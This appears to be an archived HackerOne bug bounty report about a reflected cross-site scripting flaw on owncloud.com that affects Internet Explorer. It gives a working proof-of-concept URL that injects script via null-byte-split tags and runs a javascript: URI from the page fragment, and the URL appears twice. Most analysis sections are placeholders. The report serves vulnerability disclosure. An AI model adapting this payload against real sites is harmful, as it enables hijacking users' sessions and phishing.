# Reflected XSS in owncloud.com

## Metadata
- **Source:** HackerOne
- **Report:** 127259 | https://hackerone.com/reports/127259
- **Submitted:** 2016-04-01
- **Reporter:** sergeym
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
xss does work only for inetrnet explorer, for all versions

how to reproduce? :

1. to use internet explorer browser(i have test with ie11)
2.  go to page
https://owncloud.com/wp-123.php?action[][]=</form></div></script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)

3. will be alert box with name of domain

please look at my poc vide

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

xss does work only for inetrnet explorer, for all versions

how to reproduce? :

1. to use internet explorer browser(i have test with ie11)
2.  go to page
https://owncloud.com/wp-123.php?action[][]=</form></div></script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)

3. will be alert box with name of domain

please look at my poc video in attachment

</details>

---
*Analysed by Claude on 2026-05-24*
